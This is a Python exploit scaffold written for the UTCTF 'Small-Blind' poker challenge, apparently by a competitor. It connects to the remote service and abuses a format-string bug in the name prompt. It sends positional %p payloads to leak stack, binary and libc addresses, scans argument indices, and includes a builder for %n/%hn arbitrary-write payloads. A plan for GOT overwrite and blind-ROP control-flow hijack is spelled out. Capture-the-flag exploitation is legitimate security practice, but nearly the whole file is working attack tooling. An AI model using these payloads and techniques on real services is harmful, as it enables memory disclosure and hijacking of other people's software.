#!/usr/bin/env python3
from __future__ import annotations

"""
Leak-oriented exploit scaffold for the UTCTF Small-Blind poker service.

What this currently does:
- connects to the remote service
- abuses the confirmed format string in the name prompt
- gathers stack / code / libc-ish leaks from indexed `%p`
- provides helpers for iterative recon
- leaves clear TODO points for pivoting into full exploitation

This is intentionally a scaffold, not a finished blind-ROP exploit, because
we do not yet have the binary locally. The format-string bug is confirmed, and
the next practical step is to stabilize:
1. PIE/base leak
2. libc leak
3. writable target / return-address discovery
4. controlled write primitive with `%n`

Usage examples:
    python3 solve.py
    python3 solve.py --dump-ranges
    python3 solve.py --host challenge.utctf.live --port 7255 --interactive
"""

import argparse
import re
import socket
import struct
import sys
import time
from dataclasses import dataclass
from typing import Iterable, List, Optional, Sequence

DEFAULT_HOST = "challenge.utctf.live"
DEFAULT_PORT = 7255


def p64(x: int) -> bytes:
    return struct.pack("<Q", x)


def u64(x: bytes) -> int:
    return struct.unpack("<Q", x.ljust(8, b"\x00"))[0]


def is_hex_ptr(s: str) -> bool:
    return s.startswith("0x")


@dataclass
class LeakSet:
    raw_line: str
    values: list[str]

    def ints(self) -> list[Optional[int]]:
        out: list[Optional[int]] = []
        for v in self.values:
            if v == "(nil)":
                out.append(None)
            elif v.startswith("0x"):
                try:
                    out.append(int(v, 16))
                except ValueError:
                    out.append(None)
            else:
                out.append(None)
        return out


class Remote:
    def __init__(self, host: str, port: int, timeout: float = 2.0, delay: float = 0.25):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.delay = delay
        self.sock: Optional[socket.socket] = None

    def __enter__(self) -> "Remote":
        self.connect()
        return self

    def __exit__(self, exc_type, exc, tb) -> None:
        self.close()

    def connect(self) -> None:
        self.sock = socket.create_connection(
            (self.host, self.port), timeout=self.timeout
        )
        self.sock.settimeout(self.timeout)

    def close(self) -> None:
        if self.sock is not None:
            try:
                self.sock.close()
            finally:
                self.sock = None

    def _recv_once(self, size: int = 4096) -> bytes:
        assert self.sock is not None
        return self.sock.recv(size)

    def recv_some(self, delay: Optional[float] = None) -> bytes:
        assert self.sock is not None
        if delay is None:
            delay = self.delay
        time.sleep(delay)

        out = bytearray()
        while True:
            try:
                chunk = self.sock.recv(4096)
                if not chunk:
                    break
                out.extend(chunk)
                if len(chunk) < 4096:
                    break
            except socket.timeout:
                break
        return bytes(out)

    def send(self, data: bytes) -> None:
        assert self.sock is not None
        self.sock.sendall(data)

    def sendline(self, data: bytes | str) -> None:
        if isinstance(data, str):
            data = data.encode()
        if not data.endswith(b"\n"):
            data += b"\n"
        self.send(data)

    def recv_until_name_prompt(self) -> bytes:
        out = self.recv_some(0.05)
        if b"Enter your name:" not in out:
            out += self.recv_some()
        return out


def decode(data: bytes) -> str:
    return data.decode("latin1", errors="replace")


def parse_welcome_name_block(text: str) -> Optional[str]:
    m = re.search(r"Welcome to the table, (.*?)!", text, flags=re.S)
    if not m:
        return None
    return m.group(1)


def extract_ptr_tokens(s: str) -> list[str]:
    return re.findall(r"0x[0-9a-fA-F]+|\(nil\)", s)


def fmt_payload(indices: Sequence[int], sep: str = "|") -> str:
    return sep.join(f"%{i}$p" for i in indices)


def chunked(seq: Sequence[int], n: int) -> list[list[int]]:
    return [list(seq[i : i + n]) for i in range(0, len(seq), n)]


def classify_ptr(x: int) -> str:
    if 0x7F0000000000 <= x <= 0x7FFFFFFFFFFF:
        return "high/libc_or_stack"
    if 0x7FF000000000 <= x <= 0x7FFFFFFFFFFF:
        return "stackish"
    if 0x400000 <= x <= 0x4FFFFF:
        return "text_no_pie_or_small_pie_offset"
    if x < 0x1000:
        return "tiny"
    return "other"


def pretty_hex(x: Optional[int]) -> str:
    return "(nil)" if x is None else hex(x)


def leak_once(
    host: str, port: int, payload: str, timeout: float, delay: float
) -> tuple[str, str]:
    with Remote(host, port, timeout=timeout, delay=delay) as r:
        _ = r.recv_until_name_prompt()
        r.sendline(payload)
        resp = decode(r.recv_some())
    leaked = parse_welcome_name_block(resp)
    return resp, leaked or ""


def leak_indices(
    host: str,
    port: int,
    indices: Sequence[int],
    timeout: float,
    delay: float,
) -> LeakSet:
    payload = fmt_payload(indices)
    _, leaked = leak_once(host, port, payload, timeout, delay)
    vals = leaked.split("|") if leaked else []
    return LeakSet(raw_line=leaked, values=vals)


def scan_index_ranges(
    host: str,
    port: int,
    start: int,
    end: int,
    group: int,
    timeout: float,
    delay: float,
) -> list[tuple[list[int], LeakSet]]:
    results: list[tuple[list[int], LeakSet]] = []
    for grp in chunked(list(range(start, end + 1)), group):
        leaks = leak_indices(host, port, grp, timeout, delay)
        results.append((grp, leaks))
    return results


def summarize_group(indices: Sequence[int], leaks: LeakSet) -> str:
    nums = leaks.ints()
    parts = []
    for idx, val in zip(indices, nums):
        if val is None:
            parts.append(f"{idx:>2}: (nil)")
        else:
            parts.append(f"{idx:>2}: {hex(val)} [{classify_ptr(val)}]")
    return "\n".join(parts)


def try_known_ranges(host: str, port: int, timeout: float, delay: float) -> None:
    interesting = [
        list(range(1, 11)),
        list(range(11, 20)),
        list(range(20, 29)),
        list(range(29, 37)),
    ]
    for grp in interesting:
        leaks = leak_indices(host, port, grp, timeout, delay)
        print(f"[range {grp[0]}..{grp[-1]}]")
        print(summarize_group(grp, leaks))
        print()


def guess_bases_from_sample(leaks: LeakSet, indices: Sequence[int]) -> dict[str, int]:
    out: dict[str, int] = {}
    for idx, val in zip(indices, leaks.ints()):
        if val is None:
            continue

        if 0x400000 <= val <= 0x500000:
            out[f"text_idx_{idx}"] = val

        if 0x7F0000000000 <= val <= 0x7FFFFFFFFFFF:
            out[f"hi_idx_{idx}"] = val

        if 0x7FFC00000000 <= val <= 0x7FFFFFFFFFFF:
            out[f"stack_idx_{idx}"] = val
    return out


def interactive_probe(host: str, port: int, timeout: float, delay: float) -> None:
    with Remote(host, port, timeout=timeout, delay=delay) as r:
        banner = decode(r.recv_until_name_prompt())
        sys.stdout.write(banner)
        sys.stdout.flush()

        while True:
            line = input("> ")
            r.sendline(line)
            out = decode(r.recv_some())
            print(out, end="" if out.endswith("\n") else "\n")


def send_name_only(
    host: str, port: int, name: bytes, timeout: float, delay: float
) -> str:
    with Remote(host, port, timeout=timeout, delay=delay) as r:
        _ = r.recv_until_name_prompt()
        r.sendline(name)
        return decode(r.recv_some())


def probe_truncation(host: str, port: int, timeout: float, delay: float) -> None:
    for n in [16, 32, 48, 56, 60, 61, 62, 63, 64, 65, 80, 128]:
        name = b"A" * n
        text = send_name_only(host, port, name, timeout, delay)
        leaked = parse_welcome_name_block(text)
        if leaked is None:
            print(f"{n:>3}: no welcome line parsed")
            continue
        print(f"{n:>3}: echoed_len={len(leaked)} tail={leaked[-8:]!r}")


def find_candidate_stack_pointers(
    host: str,
    port: int,
    start: int,
    end: int,
    timeout: float,
    delay: float,
) -> list[tuple[int, int]]:
    hits: list[tuple[int, int]] = []
    for idx in range(start, end + 1):
        payload = f"%{idx}$p"
        _, leaked = leak_once(host, port, payload, timeout, delay)
        vals = extract_ptr_tokens(leaked)
        if not vals:
            continue
        v = vals[0]
        if v == "(nil)":
            continue
        try:
            x = int(v, 16)
        except ValueError:
            continue
        if 0x7FFC00000000 <= x <= 0x7FFFFFFFFFFF:
            hits.append((idx, x))
    return hits


def build_write_payload_example(
    target_addr: int,
    value: int,
    arg_index: int,
    already_printed: int = 0,
    short: bool = True,
) -> bytes:
    """
    Example builder for `%n`-style writes.

    This is not yet wired into the exploit because we do not know:
    - exact stack argument placement
    - safe address-in-payload placement strategy
    - whether NUL bytes in the name input are feasible in the target path

    Still useful as a template once the binary / stack layout is known.
    """
    write_spec = "hn" if short else "n"
    modulus = 0x10000 if short else 0x100000000

    want = value % modulus
    pad = (want - already_printed) % modulus
    if pad == 0:
        fmt = f"%{arg_index}${write_spec}"
    else:
        fmt = f"%{pad}c%{arg_index}${write_spec}"

    # Appending raw addresses is typical, but only valid once the exact input
    # storage and argument-index mapping is understood.
    return fmt.encode() + b"AAAA" + p64(target_addr)


def report_known_observations() -> None:
    print("[known observations]")
    print("- name prompt is format-string vulnerable")
    print("- `%p` leaks were observed successfully")
    print("- sample leaks included addresses around:")
    print("    * stack-like: 0x7fff...")
    print("    * code-like : 0x4034c3, 0x40372d, 0x4036e0")
    print("    * libc-like : 0x7f...")
    print(
        "- `%s` at some indices crashes / truncates output, so arbitrary deref is possible-ish"
    )
    print(
        "- long names appear truncated visually around ~63 bytes, suggesting a bounded name buffer"
    )
    print()


def main() -> int:
    ap = argparse.ArgumentParser(description="Exploit scaffold for UTCTF Small-Blind")
    ap.add_argument("--host", default=DEFAULT_HOST)
    ap.add_argument("--port", default=DEFAULT_PORT, type=int)
    ap.add_argument("--timeout", default=2.0, type=float)
    ap.add_argument("--delay", default=0.35, type=float)

    ap.add_argument(
        "--dump-ranges",
        action="store_true",
        help="dump some known-interesting format-string ranges",
    )
    ap.add_argument("--scan", action="store_true", help="scan index range with %%p")
    ap.add_argument("--start", default=1, type=int)
    ap.add_argument("--end", default=50, type=int)
    ap.add_argument("--group", default=8, type=int)

    ap.add_argument(
        "--single", type=int, help="probe a single positional index with %%p"
    )
    ap.add_argument(
        "--interactive", action="store_true", help="manual line-oriented interaction"
    )
    ap.add_argument("--probe-truncation", action="store_true")
    ap.add_argument(
        "--find-stack",
        action="store_true",
        help="scan for stack-ish pointers by single index",
    )
    ap.add_argument("--raw-payload", help="send a raw name payload once")
    args = ap.parse_args()

    report_known_observations()

    if args.interactive:
        interactive_probe(args.host, args.port, args.timeout, args.delay)
        return 0

    if args.raw_payload is not None:
        text = send_name_only(
            args.host, args.port, args.raw_payload.encode(), args.timeout, args.delay
        )
        print(text)
        return 0

    if args.probe_truncation:
        probe_truncation(args.host, args.port, args.timeout, args.delay)
        return 0

    if args.single is not None:
        leaks = leak_indices(
            args.host, args.port, [args.single], args.timeout, args.delay
        )
        print(summarize_group([args.single], leaks))
        return 0

    if args.find_stack:
        hits = find_candidate_stack_pointers(
            args.host,
            args.port,
            args.start,
            args.end,
            args.timeout,
            args.delay,
        )
        print("[stack-like hits]")
        for idx, ptr in hits:
            print(f"{idx:>3}: {hex(ptr)}")
        return 0

    if args.scan:
        for grp, leaks in scan_index_ranges(
            args.host,
            args.port,
            args.start,
            args.end,
            args.group,
            args.timeout,
            args.delay,
        ):
            print(f"[range {grp[0]}..{grp[-1]}]")
            print(summarize_group(grp, leaks))
            guesses = guess_bases_from_sample(leaks, grp)
            if guesses:
                print("[guesses]")
                for k, v in guesses.items():
                    print(f"  {k}: {hex(v)}")
            print()
        return 0

    if args.dump_ranges or True:
        try_known_ranges(args.host, args.port, args.timeout, args.delay)

    print("[next steps]")
    print(
        "1. Identify exact binary from leaked text addresses (e.g. 0x4034c3 / 0x4036e0 / 0x40372d)."
    )
    print("2. Derive PIE/no-PIE status and function offsets.")
    print(
        "3. Use `%s`/`%n` with positional arguments to turn the leak into read/write."
    )
    print("4. Locate saved RIP or a GOT/exit hook target.")
    print("5. Build blind-ROP or direct control-flow hijack.")
    print()
    print("[example `%n` template]")
    demo = build_write_payload_example(0x4141414141414141, 0x1337, 12)
    print(repr(demo))

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
